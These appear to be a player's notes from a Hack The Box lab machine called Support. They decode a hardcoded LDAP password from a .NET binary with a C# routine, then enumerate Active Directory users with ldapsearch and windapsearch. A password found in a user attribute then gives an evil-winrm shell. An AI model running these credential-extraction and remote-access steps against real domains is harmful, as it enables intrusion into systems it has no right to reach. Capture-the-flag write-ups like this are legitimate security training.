# Enum
### Nmap
```bash
PORT     STATE SERVICE       REASON  VERSION
53/tcp   open  domain        syn-ack Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2023-12-08 01:38:35Z)
135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack
464/tcp  open  kpasswd5?     syn-ack
593/tcp  open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack
3268/tcp open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack
5985/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

### SMB
SMB get the UserInfo.exe

Reverse engineering

* https://github.com/icsharpcode/AvaloniaILSpy.git
* https://www.programiz.com/csharp-programming/online-compiler/

```c#
using System;
using System.Text;

static string getPassword(string enc_password)
{
    byte[] key = Encoding.ASCII.GetBytes("armando");
    
	byte[] array = Convert.FromBase64String(enc_password);
	byte[] array2 = new byte[array.Length];
	for (int i = 0; i < array.Length; i++)
	{
		array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
	}
	return Encoding.Default.GetString(array2);
}

Console.WriteLine(getPassword("0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"));
```

hardcoded password used for LDAP in the UserInfo.exe binary `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`

### Ldap
```bash
ldapsearch -H ldap://$IP -x -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=support,DC=htb
namingcontexts: CN=Configuration,DC=support,DC=htb
namingcontexts: CN=Schema,CN=Configuration,DC=support,DC=htb
namingcontexts: DC=DomainDnsZones,DC=support,DC=htb
namingcontexts: DC=ForestDnsZones,DC=support,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

```c#
public LdapQuery()
{
	string password = Protected.getPassword();
	entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
	entry.set_AuthenticationType((AuthenticationTypes)1);
	ds = new DirectorySearcher(entry);
}
```

```bash
ldapsearch -H ldap://support.htb -x -b "dc=support,dc=htb" -D "support\ldap" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' | less

/home/alvin/Tools/Windows/AD/windapsearch/windapsearch.py -d support.htb -u 'support\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --dc-ip $IP
[+] Using Domain Controller at: 10.129.227.255
[+] Getting defaultNamingContext from Root DSE
[+]     Found: DC=support,DC=htb
[+] Attempting bind
[+]     ...success! Binded as: 
[+]      u:SUPPORT\ldap

/home/alvin/Tools/Windows/AD/windapsearch/windapsearch.py -d support.htb -u 'support\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --dc-ip $IP -U
[+] Using Domain Controller at: 10.129.227.255
[+] Getting defaultNamingContext from Root DSE
[+]     Found: DC=support,DC=htb
[+] Attempting bind
[+]     ...success! Binded as: 
[+]      u:SUPPORT\ldap

[+] Enumerating all AD users
[+]     Found 20 users: 

cn: Administrator

cn: Guest

cn: krbtgt

cn: ldap

cn: support
<SNIP>....

/home/alvin/Tools/Windows/AD/windapsearch/windapsearch.py -d support.htb -u 'support\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --dc-ip $IP --full -U | grep info -n20

```

`info: Ironside47pleasure40Watchful`

# User.txt
`evil-winrm -i $IP -u support -p Ironside47pleasure40Watchful`